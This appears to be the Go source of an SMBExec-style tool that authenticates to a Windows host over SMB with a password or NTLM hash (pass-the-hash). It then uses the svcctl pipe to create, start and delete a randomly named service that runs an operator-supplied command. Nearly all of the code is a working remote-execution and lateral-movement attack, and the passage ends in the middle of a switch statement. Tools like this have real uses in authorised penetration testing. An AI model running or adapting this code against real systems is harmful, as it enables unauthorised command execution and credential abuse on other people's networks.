package main

import (
	"bufio"
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"go-smbexec/helpers"
	"go-smbexec/pkg"
	"go-smbexec/pkg/smb"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"
	"unicode/utf16"
)

func main() {
	target := flag.String("Target", "", "Target")
	username := flag.String("Username", "", "Username")
	domain := flag.String("Domain", "", "Domain")
	command := flag.String("Command", "", "Command")
	commandCOMSPEC := flag.String("CommandCOMSPEC", "Y", "CommandCOMSPEC")
	hash := flag.String("Hash", "", "Hash")
	password := flag.String("Password", "", "Password")
	service := flag.String("Service", "", "Service")
	version := flag.String("Version", "Auto", "Version: Auto | SMB2.1 | SMB1 (Default: Auto)")
	session := flag.Bool("Session", false, "Session")
	logoff := flag.Bool("Logoff", false, "Logoff")
	refresh := flag.Bool("Refresh", false, "Refresh")
	sleep := flag.Int("Sleep", 150, "Sleep")
	debug := flag.Bool("Debug", false, "Debug")

	flag.Parse()

	if flag.NFlag() == 0 {
		fmt.Println("[-] Target is required when not using -Session")
		os.Exit(1)
	}

	parsedHash := *hash
	if strings.Contains(parsedHash, ":") {
		parsedHash = parsedHash[strings.Index(parsedHash, ":")+1:]
	}

	// parsedUsername := *username
	// if *domain != "" {
	// 	parsedUsername = *domain + "\\" + *username
	// }

	processID := fmt.Sprintf("%x", helpers.GetCurrentProcessID())
	processIDBytes, _ := hex.DecodeString(processID)
	if len(processIDBytes) > 2 {
		tempBytes := make([]byte, 2)
		copy(tempBytes, processIDBytes[:2])
		processIDBytes = tempBytes
	}
	processIDByteArray := make([]byte, 4)
	copy(processIDByteArray[:], processIDBytes)

	config := pkg.NewSmbConfig(version, target, username, domain, command, commandCOMSPEC, password, &parsedHash, service, session, logoff, refresh, sleep, debug)

	Host := strings.Split(*config.Target, ":")[0]

	var client net.TCPConn
	client.SetReadDeadline(time.Now().Add(60 * time.Second))

	conn, err := net.Dial("tcp", *config.Target)
	if err != nil {
		fmt.Printf("Failed to connect to %s: %s\n", *config.Target, err)
		return
	}
	defer conn.Close()

	stage := ""
	stageNext := ""
	_ = stageNext

	if *config.SmbVersion == "SMB2.1" {
		stage = "NegotiateSMB2"
	} else {
		stage = "NegotiateSMB"
	}

	negotiation_failed := false
	_ = negotiation_failed

	client_stream := bufio.NewWriter(conn)

	client_recieve := make([]byte, 4096)

	SMBSigning := false
	var sessionKeyLength, negotiateFlags []byte
	_ = sessionKeyLength

	messageID := 1
	treeID := []byte{0x00, 0x00, 0x00, 0x00}
	sessionID := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}

	loginSuccessful := false

	for stage != "Exit" {
		switch stage {
		case "NegotiateSMB":
			SMB_header := smb.NewPacketSMBHeader([]byte{0x72}, []byte{0x18}, []byte{0x01, 0x48}, []byte{0xff, 0xff}, processIDBytes, []byte{0x00, 0x00})
			SMB_data := smb.NewPacketSMBNegotiateProtocolRequest(*config.SmbVersion)
			NetBIOS_session_service := pkg.NewPacketNetBIOSSessionService(len(SMB_header), len(SMB_data))
			SMB_header = append(SMB_header, SMB_data...)
			content := append(NetBIOS_session_service, SMB_header...)
			_, err := client_stream.Write(content)
			client_stream.Flush()
			conn.Read(client_recieve)
			if err != nil {
				fmt.Printf("[-] SMB1 negotiation failed with %s \n", *config.Target)
				if *config.Debug {
					fmt.Println(err)
				}
				stage = "Exit"
				negotiation_failed = true
				break
			}

			if bytes.Equal(client_recieve[4:8], []byte{0xff, 0x53, 0x4d, 0x42}) {
				*config.SmbVersion = "SMB1"
				stage = "NTLMSSPNegotiate"

				if client_recieve[39] == 0x0f {
					if config.SigningCheck {
						fmt.Println("[+] SMB signing is required on", target)
						stage = "Exit"
					} else {
						fmt.Println("[+] SMB signing is required")
						SMBSigning = true
						sessionKeyLength = []byte{0x00, 0x00}
						negotiateFlags = []byte{0x15, 0x82, 0x08, 0xa0}
					}
				} else {
					if config.SigningCheck {
						fmt.Println("[+] SMB signing is not required on", target)
						stage = "Exit"
					} else {
						SMBSigning = false
						sessionKeyLength = []byte{0x00, 0x00}
						negotiateFlags = []byte{0x05, 0x82, 0x08, 0xa0}
					}
				}
			} else {
				stage = "NegotiateSMB2"

				if client_recieve[70] == 0x03 {
					if config.SigningCheck {
						fmt.Println("[+] SMB signing is required on", target)
						stage = "Exit"
					} else {
						if config.SigningCheck {
							fmt.Println("[+] SMB signing is required")
						}
						SMBSigning = true
						sessionKeyLength = []byte{0x00, 0x00}
						negotiateFlags = []byte{0x15, 0x82, 0x08, 0xa0}
					}
				} else {
					if config.SigningCheck {
						fmt.Println("[+] SMB signing is not required on", target)
						stage = "Exit"
					} else {
						SMBSigning = false
						sessionKeyLength = []byte{0x00, 0x00}
						negotiateFlags = []byte{0x05, 0x80, 0x08, 0xa0}
					}
				}
			}
		case "NegotiateSMB2":

			if *config.SmbVersion == "SMB2.1" {
				messageID = 0
			} else {
				messageID = 1
			}

			treeID = []byte{0x00, 0x00, 0x00, 0x00}
			sessionID = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
			SMB2Header := smb.NewPacketSMB2Header([]byte{0x00, 0x00}, []byte{0x00, 0x00}, false, messageID, processIDByteArray[:], treeID, sessionID)
			SMB2Data := smb.NewPacketSMB2NegotiateProtocolRequest()
			NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), len(SMB2Data))
			clientSend := append(NetBIOSsessionService, append(SMB2Header, SMB2Data...)...)
			client_stream.Write(clientSend)
			client_stream.Flush()
			_, err = conn.Read(client_recieve)
			stage = "NTLMSSPNegotiate"

			if client_recieve[70] == 0x03 {
				if config.SigningCheck {
					fmt.Println("[+] SMB signing is required on", target)
					stage = "Exit"
				} else {
					if config.SigningCheck {
						fmt.Println("[+] SMB signing is required")
					}
					SMBSigning = true
					sessionKeyLength = []byte{0x00, 0x00}
					negotiateFlags = []byte{0x15, 0x82, 0x08, 0xa0}
				}
			} else {
				if config.SigningCheck {
					fmt.Println("[+] SMB signing is not required on", target)
					stage = "Exit"
				} else {
					SMBSigning = false
					sessionKeyLength = []byte{0x00, 0x00}
					negotiateFlags = []byte{0x05, 0x80, 0x08, 0xa0}
				}
			}
		case "NTLMSSPNegotiate":
			if *config.SmbVersion == "SMB1" {
				packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x73}, []byte{0x18}, []byte{0x07, 0xc8}, []byte{0xff, 0xff}, processIDBytes, []byte{0x00, 0x00})
				if SMBSigning {
					packetSMBHeader.Set("Flags2", []byte{0x05, 0x48})
				}
				SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
				NTLMSSPNegotiate := pkg.NewPacketNTLMSSPNegotiate(negotiateFlags, []byte{})
				SMBData := smb.NewPacketSMBSessionSetupAndXRequest(NTLMSSPNegotiate)
				NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), len(SMBData))
				client_stream.Write(append(NetBIOSsessionService, append(SMBHeader, SMBData...)...))
			} else {
				messageID++
				SMB2Header := smb.NewPacketSMB2Header([]byte{0x01, 0x00}, []byte{0x1f, 0x00}, false, messageID, processIDByteArray[:], treeID, sessionID)
				NTLMSSPNegotiate := pkg.NewPacketNTLMSSPNegotiate(negotiateFlags, []byte{})
				SMB2Data := smb.NewPacketSMB2SessionSetupRequest(NTLMSSPNegotiate)
				NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), len(SMB2Data))
				client_stream.Write(append(NetBIOSsessionService, append(SMB2Header, SMB2Data...)...))
			}

			client_stream.Flush()
			conn.Read(client_recieve)
			stage = "Exit"

		}

	}

	var SMBUserID []byte
	var sessionKey []byte
	HMACSHA256 := hmac.New(sha256.New, sessionKey)

	if !config.SigningCheck && !negotiation_failed {

		NTLMSSP := hex.EncodeToString(client_recieve)
		NTLMSSPIndex := strings.Index(NTLMSSP, "4e544c4d53535000")
		NTLMSSPBytesIndex := NTLMSSPIndex / 2
		domainLength := helpers.GetUInt16DataLength(NTLMSSPBytesIndex+12, client_recieve)
		targetLength := helpers.GetUInt16DataLength(NTLMSSPBytesIndex+40, client_recieve)
		sessionID = client_recieve[44:52]
		NTLMChallenge := client_recieve[NTLMSSPBytesIndex+24 : NTLMSSPBytesIndex+32]
		targetDetails := client_recieve[NTLMSSPBytesIndex+56+int(domainLength) : NTLMSSPBytesIndex+56+int(domainLength)+int(targetLength)]
		targetTimeBytes := targetDetails[len(targetDetails)-14 : len(targetDetails)-6]

		var NTLMHashBytes []byte
		for i := 0; i < len(*config.Hash); i += 2 {
			substring := (*config.Hash)[i : i+2]
			NTLMHashBytes = append(NTLMHashBytes, helpers.ParseHex(substring))
		}

		authHostname, _ := os.Hostname()
		authHostnameBytes := helpers.Uint16ToBytes(utf16.Encode([]rune(authHostname)))
		authDomainBytes := helpers.Uint16ToBytes(utf16.Encode([]rune(*config.Domain)))
		authUsernameBytes := helpers.Uint16ToBytes(utf16.Encode([]rune(*config.Username)))
		authDomainLength := make([]byte, 2)
		binary.LittleEndian.PutUint16(authDomainLength, uint16(len(authDomainBytes)))
		authUsernameLength := make([]byte, 2)
		binary.LittleEndian.PutUint16(authUsernameLength, uint16(len(authUsernameBytes)))
		authHostnameLength := make([]byte, 2)
		binary.LittleEndian.PutUint16(authHostnameLength, uint16(len(authHostnameBytes)))
		authDomainOffset := []byte{0x40, 0x00, 0x00, 0x00}
		authUsernameOffset := make([]byte, 4)
		binary.LittleEndian.PutUint32(authUsernameOffset, uint32(len(authDomainBytes)+64))
		authHostnameOffset := make([]byte, 4)
		binary.LittleEndian.PutUint32(authHostnameOffset, uint32(len(authDomainBytes)+len(authUsernameBytes)+64))
		authLMOffset := make([]byte, 4)
		binary.LittleEndian.PutUint32(authLMOffset, uint32(len(authDomainBytes)+len(authUsernameBytes)+len(authHostnameBytes)+64))
		authNTLMOffset := make([]byte, 4)
		binary.LittleEndian.PutUint32(authNTLMOffset, uint32(len(authDomainBytes)+len(authUsernameBytes)+len(authHostnameBytes)+88))
		HMACMD5 := hmac.New(md5.New, NTLMHashBytes)
		usernameAndTarget := strings.ToUpper(*config.Username)
		usernameAndTargetBytes := helpers.Uint16ToBytes(utf16.Encode([]rune(usernameAndTarget)))
		usernameAndTargetBytes = append(usernameAndTargetBytes, authDomainBytes...)
		HMACMD5.Write(usernameAndTargetBytes)
		NTLMv2Hash := HMACMD5.Sum(nil)

		clientChallengeBytes := make([]byte, 8)
		for i := 0; i < 8; i++ {
			clientChallengeBytes[i] = byte(rand.Intn(255) + 1)
		}

		securityBlobBytes := []byte{
			0x01, 0x01, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00,
		}
		securityBlobBytes = append(securityBlobBytes, targetTimeBytes...)
		securityBlobBytes = append(securityBlobBytes, clientChallengeBytes...)
		securityBlobBytes = append(securityBlobBytes, []byte{0x00, 0x00, 0x00, 0x00}...)
		securityBlobBytes = append(securityBlobBytes, targetDetails...)
		securityBlobBytes = append(securityBlobBytes, []byte{0x00, 0x00, 0x00, 0x00}...)
		securityBlobBytes = append(securityBlobBytes, []byte{0x00, 0x00, 0x00, 0x00}...)

		serverChallengeAndSecurityBlobBytes := append(NTLMChallenge, securityBlobBytes...)
		HMACMD5.Reset()
		HMACMD5 = hmac.New(md5.New, NTLMv2Hash)
		HMACMD5.Write(serverChallengeAndSecurityBlobBytes)
		NTLMv2Response := HMACMD5.Sum(nil)

		if SMBSigning {
			HMACMD5.Reset()
			HMACMD5.Write(NTLMv2Response)
			sessionBaseKey := HMACMD5.Sum(nil)
			sessionKey = sessionBaseKey
			HMACSHA256 = hmac.New(sha256.New, sessionKey)
			_ = HMACSHA256
			// Use HMAC-SHA256 with sessionKey
		}

		NTLMv2Response = append(NTLMv2Response, securityBlobBytes...)
		NTLMv2ResponseLength := make([]byte, 2)
		binary.LittleEndian.PutUint16(NTLMv2ResponseLength, uint16(len(NTLMv2Response)))
		sessionKeyOffset := make([]byte, 4)
		binary.LittleEndian.PutUint32(sessionKeyOffset, uint32(len(authDomainBytes)+len(authUsernameBytes)+len(authHostnameBytes)+len(NTLMv2Response)+88))

		NTLMSSPResponse := []byte{
			0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00,
			0x03, 0x00, 0x00, 0x00,
			0x18, 0x00,
			0x18, 0x00,
		}
		NTLMSSPResponse = append(NTLMSSPResponse, authLMOffset...)
		NTLMSSPResponse = append(NTLMSSPResponse, NTLMv2ResponseLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, NTLMv2ResponseLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, authNTLMOffset...)
		NTLMSSPResponse = append(NTLMSSPResponse, authDomainLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, authDomainLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, authDomainOffset...)
		NTLMSSPResponse = append(NTLMSSPResponse, authUsernameLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, authUsernameLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, authUsernameOffset...)
		NTLMSSPResponse = append(NTLMSSPResponse, authHostnameLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, authHostnameLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, authHostnameOffset...)
		NTLMSSPResponse = append(NTLMSSPResponse, sessionKeyLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, sessionKeyLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, sessionKeyOffset...)
		NTLMSSPResponse = append(NTLMSSPResponse, negotiateFlags...)
		NTLMSSPResponse = append(NTLMSSPResponse, authDomainBytes...)
		NTLMSSPResponse = append(NTLMSSPResponse, authUsernameBytes...)
		NTLMSSPResponse = append(NTLMSSPResponse, authHostnameBytes...)
		NTLMSSPResponse = append(NTLMSSPResponse, []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}...)
		NTLMSSPResponse = append(NTLMSSPResponse, []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}...)
		NTLMSSPResponse = append(NTLMSSPResponse, NTLMv2Response...)

		var clientSend []byte
		if *config.SmbVersion == "SMB1" {
			SMBUserID = []byte{client_recieve[32], client_recieve[33]}
			packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x73}, []byte{0x18}, []byte{0x07, 0xc8}, []byte{0xff, 0xff}, processIDBytes, SMBUserID)

			if SMBSigning {
				packetSMBHeader.Set("Flags2", []byte{0x05, 0x48})
			}

			packetSMBHeader.Set("UserID", SMBUserID)
			NTLMSSPNegotiate := pkg.NewPacketNTLMSSPAuth(NTLMSSPResponse)
			SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
			SMBData := smb.NewPacketSMBSessionSetupAndXRequest(NTLMSSPNegotiate)
			NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), len(SMBData))
			clientSend = append(NetBIOSsessionService, SMBHeader...)
			clientSend = append(clientSend, SMBData...)
		} else {
			messageID++
			SMB2Header := smb.NewPacketSMB2Header([]byte{0x01, 0x00}, []byte{0x01, 0x00}, false, messageID, processIDByteArray[:], treeID, sessionID)
			NTLMSSPAuth := pkg.NewPacketNTLMSSPAuth(NTLMSSPResponse)
			SMB2Data := smb.NewPacketSMB2SessionSetupRequest(NTLMSSPAuth)
			NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMB2Header), len(SMB2Data))
			clientSend = append(NetBIOSSessionService, SMB2Header...)
			clientSend = append(clientSend, SMB2Data...)

		}

		client_stream.Write(clientSend)
		client_stream.Flush()
		conn.Read(client_recieve)

		if *config.SmbVersion == "SMB1" {
			if bytes.Equal(client_recieve[9:13], []byte{0x00, 0x00, 0x00, 0x00}) {
				fmt.Printf("[+] %s successfully authenticated on %s\n", *config.Username, *config.Target)
				loginSuccessful = true
			} else {
				fmt.Printf("[!] %s failed to authenticate on %s\n", *config.Username, *config.Target)
				loginSuccessful = false
			}
		} else {
			if bytes.Equal(client_recieve[12:16], []byte{0x00, 0x00, 0x00, 0x00}) {
				fmt.Printf("[+] %s successfully authenticated on %s\n", *config.Username, *config.Target)
				loginSuccessful = true
			} else {
				fmt.Printf("[!] %s failed to authenticate on %s\n", *config.Username, *config.Target)
				loginSuccessful = false
			}
		}

	}

	if loginSuccessful {
		SMBPath := "\\\\" + Host + "\\IPC$"

		var SMBPathBytes []byte
		if *config.SmbVersion == "SMB1" {
			SMBPathBytes = append([]byte(SMBPath), 0x00)
		} else {
			SMBPathBytes = helpers.Uint16ToBytes(utf16.Encode([]rune(SMBPath)))
		}

		namedPipeUUID := []byte{0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35, 0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10, 0x03}
		_ = namedPipeUUID

		SMBServiceRandom := []uint16{}
		SMBServiceBytes := []byte{}
		if *config.Service == "" {
			rand.Seed(time.Now().UnixNano())
			for i := 0; i < 20; i++ {
				randNum := uint16(rand.Intn(90-65+1) + 65)
				SMBServiceRandom = append(SMBServiceRandom, randNum)
			}
			SMBServiceBytes = helpers.Uint16ToBytes(SMBServiceRandom)
			SMBServiceBytes = append(SMBServiceBytes, []byte{0x00, 0x00, 0x00, 0x00}...)
		} else {
			SMBServiceBytes = helpers.Uint16ToBytes(utf16.Encode([]rune(*config.Service)))
			if len(SMBServiceBytes)%4 != 0 {
				SMBServiceBytes = append(SMBServiceBytes, []byte{0x00, 0x00}...)
			} else {
				SMBServiceBytes = append(SMBServiceBytes, []byte{0x00, 0x00, 0x00, 0x00}...)
			}
		}

		_ = SMBPathBytes

		smbServiceLength := make([]byte, 4)
		binary.LittleEndian.PutUint32(smbServiceLength, uint32(len(SMBServiceRandom)+1))

		command := ""
		if *config.CommandSpec == "Y" {
			command = "%COMSPEC% /C \"" + *config.Command + "\""
		} else {
			command = "\"" + *config.Command + "\""
		}

		commandBytes := helpers.Uint16ToBytes(utf16.Encode([]rune(command)))

		if len(command)%2 != 0 {
			commandBytes = append(commandBytes, []byte{0x00, 0x00}...)
		} else {
			commandBytes = append(commandBytes, []byte{0x00, 0x00, 0x00, 0x00}...)
		}

		commandLengthBytes := make([]byte, 4)
		binary.LittleEndian.PutUint32(commandLengthBytes, uint32(len(commandBytes)/2))

		smbSplitIndex := 4256
		// var smbSplitIndexTracker, smbSplitStage int
		var SMBTreeID, SMBFID, smbServiceManagerContextHandle, SCMData []byte

		var smbCloseServiceHandleStage int
		var SMBSigningCounter int
		if *config.SmbVersion == "SMB1" {
			stage = "TreeConnectAndXRequest"
			for stage != "Exit" {
				switch stage {
				case "CheckAccess":
					if bytes.Equal(client_recieve[108:112], []byte{0x00, 0x00, 0x00, 0x00}) && !bytes.Equal(client_recieve[88:108], []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}) {
						smbServiceManagerContextHandleSlice := client_recieve[88:108]
						smbServiceManagerContextHandle = make([]byte, len(smbServiceManagerContextHandleSlice))
						copy(smbServiceManagerContextHandle, smbServiceManagerContextHandleSlice)
						if *config.Command != "" {
							fmt.Printf("%s has Service Control Manager write privilege on %s\n", *config.Username, *config.Target)
							SCMData = pkg.NewPacketSCMCreateServiceW(smbServiceManagerContextHandle, SMBServiceBytes, smbServiceLength, commandBytes, commandLengthBytes)

							if len(SCMData) < smbSplitIndex {
								stage = "CreateServiceW"
							} else {
								// TODO add support for longer commands
								fmt.Println("[-] Command is too long, please use a shorter command and try again")
								stage = "Exit"
							}

						} else {
							fmt.Printf("%s has Service Control Manager write privilege on %s\n", *config.Username, *config.Target)
							smbCloseServiceHandleStage = 2
							stage = "CloseServiceHandle"
						}
					} else if bytes.Equal(client_recieve[108:112], []byte{0x05, 0x00, 0x00, 0x00}) {
						fmt.Printf("[-] %s does not have Service Control Manager write privilege on %s\n", *config.Username, *config.Target)
						stage = "Exit"
					} else {
						fmt.Printf("[-] Soming went wrong with %s", *config.Target)
						stage = "Exit"
					}
				case "CloseRequest":
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x04}, []byte{0x18}, []byte{0x07, 0xc8}, SMBTreeID, processIDByteArray[:], SMBUserID)

					if SMBSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					SMBData := smb.NewPacketSMBCloseRequest([]byte{0x00, 0x40})
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), len(SMBData))

					if SMBSigning {
						SMBHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, SMBHeader, SMBData)
					}

					clientSend := append(NetBIOSSessionService, SMBHeader...)
					clientSend = append(clientSend, SMBData...)
					client_stream.Write(clientSend)
					client_stream.Flush()
					conn.Read(client_recieve)
					stage = "TreeDisconnect"
				case "CloseServiceHandle":
					if smbCloseServiceHandleStage == 1 {
						fmt.Println("[+] Service deleted on " + *config.Target)
						smbCloseServiceHandleStage++
						SCMData = pkg.NewPacketSCMCloseServiceHandle(smbServiceManagerContextHandle)
					} else {
						stage = "CloseRequest"
						SCMData = pkg.NewPacketSCMCloseServiceHandle(smbServiceManagerContextHandle)
					}

					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2f}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

					if SMBSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					RPCData := pkg.NewPacketRPCRequest([]byte{0x03}, len(SCMData), 0, 0, []byte{0x05, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x00, 0x00}, []byte{})
					SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					SMBData := smb.NewPacketSMBWriteAndXRequest(SMBFID, len(RPCData)+len(SCMData))
					RPCDataLength := len(SMBData) + len(SCMData) + len(RPCData)
					NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), RPCDataLength)

					if SMBSigning {
						SMBHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, SMBHeader, SMBData, RPCData, SCMData)
					}

					clientSend := append(NetBIOSsessionService, SMBHeader...)
					clientSend = append(clientSend, SMBData...)
					clientSend = append(clientSend, RPCData...)
					clientSend = append(clientSend, SCMData...)

					client_stream.Write(clientSend)
					client_stream.Flush()
					conn.Read(client_recieve)

				case "CreateAndXRequest":
					SMBNamedPipeBytes := []byte{0x5c, 0x73, 0x76, 0x63, 0x63, 0x74, 0x6c, 0x00} // \svcctl
					SMBTreeID = client_recieve[28:30]
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0xa2}, []byte{0x18}, []byte{0x02, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

					if SMBSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					SMBData := smb.NewPacketSMBNTCreateAndXRequest(SMBNamedPipeBytes)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), len(SMBData))

					if SMBSigning {
						SMBHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, SMBHeader, SMBData)
					}

					clientSend := append(NetBIOSSessionService, SMBHeader...)
					clientSend = append(clientSend, SMBData...)
					client_stream.Write(clientSend)
					client_stream.Flush()
					conn.Read(client_recieve)
					stage = "RPCBind"

				case "CreateServiceW":
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2f}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

					if SMBSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					SCMData = pkg.NewPacketSCMCreateServiceW(smbServiceManagerContextHandle, SMBServiceBytes, smbServiceLength, commandBytes, commandLengthBytes)
					RPCData := pkg.NewPacketRPCRequest([]byte{0x03}, len(SCMData), 0, 0, []byte{0x02, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x0c, 0x00}, []byte{})
					SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					SMBData := smb.NewPacketSMBWriteAndXRequest(SMBFID, len(RPCData)+len(SCMData))
					RPCDataLength := len(SMBData) + len(SCMData) + len(RPCData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), RPCDataLength)

					if SMBSigning {
						SMBHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, SMBHeader, SMBData, RPCData, SCMData)
					}

					clientSend := append(NetBIOSSessionService, SMBHeader...)
					clientSend = append(clientSend, SMBData...)
					clientSend = append(clientSend, RPCData...)
					clientSend = append(clientSend, SCMData...)
					client_stream.Write(clientSend)
					client_stream.Flush()
					conn.Read(client_recieve)
					stage = "ReadAndXRequest"
					stageNext = "StartServiceW"

				// case "CreateServiceW_First":
				// 	SMBSplitStageFinal := int(math.Ceil(float64(len(SCMData)) / float64(smbSplitIndex)))
				// 	packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2f}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

				// 	if SMBSigning {
				// 		smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
				// 	}

				// 	SCMDataFirst := SCMData[:smbSplitIndex]
				// 	packetRPCData := pkg.NewPacketRPCRequestUnflat([]byte{0x01}, 0, 0, 0, []byte{0x02, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x0c, 0x00}, SCMDataFirst)
				// 	packetRPCData.Set("AllocHint", helpers.Uint16ToBytes([]uint16{uint16(len(SCMData))}))
				// 	smbSplitIndexTracker = smbSplitIndex
				// 	_ = smbSplitIndexTracker
				// 	RPCData := helpers.FlattenOrderedMap(*packetRPCData)
				// 	SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
				// 	SMBData := smb.NewPacketSMBWriteAndXRequest(SMBFID, len(RPCData))
				// 	RPCDataLength := len(SMBData) + len(RPCData)
				// 	NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), RPCDataLength)

				// 	if SMBSigning {
				// 		SMBHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, SMBHeader, SMBData, RPCData)
				// 	}

				// 	clientSend := append(NetBIOSSessionService, SMBHeader...)
				// 	clientSend = append(clientSend, SMBData...)
				// 	clientSend = append(clientSend, RPCData...)
				// 	client_stream.Write(clientSend)
				// 	client_stream.Flush()
				// 	conn.Read(client_recieve)

				// 	if SMBSplitStageFinal <= 2 {
				// 		stage = "CreateServiceW_Last"
				// 	} else {
				// 		smbSplitStage = 2
				// 		_ = smbSplitStage
				// 		stage = "CreateServiceW_Middle"
				// 	}
				case "DeleteServiceW":
					if bytes.Equal(client_recieve[88:92], []byte{0x1d, 0x04, 0x00, 0x00}) {
						fmt.Println("[+] Command executed with service on " + *config.Target)
					} else if bytes.Equal(client_recieve[88:92], []byte{0x02, 0x00, 0x00, 0x00}) {
						fmt.Println("[-] Service failed to start on", *config.Target)
					}

					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2f}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

					if SMBSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					SCMData = pkg.NewPacketSCMDeleteServiceW(smbServiceManagerContextHandle)
					RPCData := pkg.NewPacketRPCRequest([]byte{0x03}, len(SCMData), 0, 0, []byte{0x04, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x02, 0x00}, []byte{})
					SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					SMBData := smb.NewPacketSMBWriteAndXRequest(SMBFID, len(RPCData)+len(SCMData))
					RPCDataLength := len(SMBData) + len(SCMData) + len(RPCData)
					NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), RPCDataLength)

					if SMBSigning {
						SMBHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, SMBHeader, SMBData, RPCData, SCMData)
					}

					clientSend := append(NetBIOSsessionService, SMBHeader...)
					clientSend = append(clientSend, SMBData...)
					clientSend = append(clientSend, RPCData...)
					clientSend = append(clientSend, SCMData...)

					client_stream.Write(clientSend)
					client_stream.Flush()
					conn.Read(client_recieve)

					stage = "ReadAndXRequest"
					stageNext = "CloseServiceHandle"
					smbCloseServiceHandleStage = 1

				case "Logoff":
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x74}, []byte{0x18}, []byte{0x07, 0xc8}, []byte{0x34, 0xfe}, processIDBytes, SMBUserID)

					if SMBSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					SMBHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					SMBData := smb.NewPacketSMBLogoffAndXRequest()
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(SMBHeader), len(SMBData))

					if SMBSigning {
						SMBHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, SMBHeader, SMBData)
					}

					clientSend := append(NetBIOSSessionService, SMBHeader...)
					clientSend = append(clientSend, SMBData...)
					client_stream.Write(clientSend)
					client_stream.Flush()
					conn.Read(client_recieve)
					stage = "Exit"

				case "OpenSCManagerW":
